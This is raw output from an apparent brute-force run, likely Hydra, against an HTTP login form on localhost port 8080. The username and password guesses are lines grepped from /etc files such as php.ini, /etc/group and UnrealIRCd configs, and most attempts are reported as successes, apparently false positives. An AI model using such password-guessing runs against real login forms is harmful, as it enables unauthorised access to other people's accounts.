[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:help Svslusers {   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the global and/or local maximum user count";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 572036 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the global and/or local maximum user count";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 572361 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the global and/or local maximum user count";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 572362 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the global and/or local maximum user count";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 572363 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the global and/or local maximum user count";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 572364 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Example: SVSLUSERS irc.test.com -1 200";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 572689 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Example: SVSLUSERS irc.test.com -1 200";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 572690 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Example: SVSLUSERS irc.test.com -1 200";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 572691 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Example: SVSLUSERS irc.test.com -1 200";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 572692 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Example: SVSLUSERS irc.test.com -1 200";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the WATCH list of a user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 573017 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Example: SVSLUSERS irc.test.com -1 200";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the WATCH list of a user.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 573018 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Example: SVSLUSERS irc.test.com -1 200";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the WATCH list of a user.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 573019 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Example: SVSLUSERS irc.test.com -1 200";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the WATCH list of a user.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 573020 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the WATCH list of a user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the SILENCE list of a user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 573345 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the WATCH list of a user.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the SILENCE list of a user.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 573346 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the WATCH list of a user.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the SILENCE list of a user.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 573347 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the WATCH list of a user.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the SILENCE list of a user.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 573348 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the SILENCE list of a user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the snomask of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 573673 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the SILENCE list of a user.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the snomask of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 573674 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the SILENCE list of a user.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the snomask of the User in question.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 573675 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the SILENCE list of a user.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " Changes the snomask of the User in question.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 573676 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the snomask of the User in question.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 574001 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the snomask of the User in question.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 574002 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the snomask of the User in question.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 574003 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " Changes the snomask of the User in question.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " the change to the user.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 574004 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 574329 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 574330 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 574331 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " the change to the user.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 574332 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 574657 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 574985 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 574986 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 574987 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 574988 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " _the current session only_, this means if the user reconnects";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 575313 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " _the current session only_, this means if the user reconnects";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 575314 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " _the current session only_, this means if the user reconnects";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 575315 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/help.conf:      " _the current session only_, this means if the user reconnects";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 575316 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " _the current session only_, this means if the user reconnects";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 575641 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " _the current session only_, this means if the user reconnects";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 575642 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " _the current session only_, this means if the user reconnects";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 575643 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/help.conf:  " _the current session only_, this means if the user reconnects";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 575644 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode " - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 575969 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode " - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 575970 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode " - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 575971 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode " - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 575972 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode    password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/spamfilter.conf:        reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 576297 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode    password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/spamfilter.conf:        reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 576298 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode    password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/spamfilter.conf:        reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 576299 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode    password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/unreal/spamfilter.conf:        reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 576300 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/spamfilter.conf:    reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/group:users:x:100:" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 576625 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/spamfilter.conf:    reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/group:users:x:100:" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 576626 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/spamfilter.conf:    reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/group:users:x:100:" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 576627 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/unreal/spamfilter.conf:    reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/group:users:x:100:" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 576628 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:users:x:100:   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/group:user:x:1001:" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 576953 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:users:x:100:   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/group:user:x:1001:" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 576954 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:users:x:100:   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/group:user:x:1001:" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 576955 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:users:x:100:   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/group:user:x:1001:" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 576956 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:user:x:1001:   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:       # expand ~username type directory specifications" - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 577281 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:user:x:1001:   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:       # expand ~username type directory specifications" - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 577282 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:user:x:1001:   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:       # expand ~username type directory specifications" - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 577283 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/group:user:x:1001:   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:       # expand ~username type directory specifications" - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 577284 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:   # expand ~username type directory specifications   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this." - pass "/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)" - 577609 of 577936 [child 2] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:   # expand ~username type directory specifications   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this." - pass "/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)." - 577610 of 577936 [child 3] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:   # expand ~username type directory specifications   password: /etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this." - pass "/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file." - 577611 of 577936 [child 1] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:   # expand ~username type directory specifications   password: /etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
[ATTEMPT] target 127.0.0.1 - login "/etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this." - pass "/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")" - 577612 of 577936 [child 0] (0/0)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this.   password: /etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
[8080][http-post-form] host: 127.0.0.1   login: /etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this.   password: /etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
